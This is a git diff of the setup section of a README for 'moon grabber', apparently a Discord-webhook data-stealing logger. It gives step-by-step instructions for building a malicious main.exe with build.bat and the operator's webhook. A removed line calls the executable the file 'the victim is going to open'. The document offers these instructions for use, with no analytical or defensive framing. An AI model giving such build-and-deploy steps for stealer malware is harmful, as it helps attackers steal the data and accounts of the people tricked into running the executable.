@@ -35,16 +35,11 @@
 ### Setup
 
 1. Download moon grabber
-
 2. Run build.bat
-
-3. If you have python installed type y and press enter but if you don't have python press n to install.
-
-4. For people who pressed y: Enter your discord webhook.
-
-5. For people who pressed n: Rerun build.bat (if you pressed n and installed python) and this time press y and enter your discord webhook.
-
-6. Go to the moon-grabber folder and you will find another folder called "dist", open it and you will see "main.exe" that is your grabber the victim is going to open.
+3. if you have python installed, press y else press n
+4. enter your webhook
+5. it will build the logger for you. when the terminal closes, check the moon grabber folder for a folder called dist.
+6. open and find your main.exe
 
 Enjoy!
 
